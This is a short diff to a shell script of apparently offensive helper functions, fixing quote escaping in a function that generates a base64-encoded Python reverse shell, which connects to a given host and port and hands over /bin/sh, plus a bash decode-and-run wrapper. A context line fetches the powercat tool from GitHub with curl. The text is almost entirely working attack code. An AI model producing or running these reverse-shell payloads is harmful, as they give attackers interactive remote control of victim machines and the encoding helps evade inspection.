@@ -18,7 +18,7 @@ echo `curl -s https://raw.githubusercontent.com/besimorhino/powercat/master/powe
 }
 
 reverse-shell-python(){
-REVERSE=$(echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$1",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" | base64 | tr -d '\n');
+REVERSE=$(echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);i'" | base64 | tr -d '\n');
 
 echo "echo '$REVERSE' | base64 --decode | /bin/bash";
 }
